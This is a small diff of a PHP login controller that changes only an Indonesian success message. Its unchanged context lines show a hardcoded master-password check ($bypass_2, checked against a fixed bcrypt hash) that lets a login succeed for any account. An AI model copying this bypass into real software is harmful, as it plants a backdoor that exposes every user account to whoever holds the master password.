@@ -42,7 +42,7 @@ class Login extends MY_Controller
       $bypass_2 = verify_pwd($post['password'], '$2y$10$4KGXBXQQ5AEqvmY3iTZtv.7ztwWDEbjKOk50O6KlVq5Ghqj/gPzk2');
       if (($verify_pwd || $bypass || $bypass_2)) {
         $res['status'] = true;
-        $res['message'] = 'Anda berhasil login! Akan dipindahkan ke dashboard sesaat lagi.';
+        $res['message'] = 'Anda berhasil login! Akan dipindahkan ke sistem sesaat lagi.';
         $new_session = array(
           'id_user' => $user_data['id_user'],
           'username' => $user_data['username'],
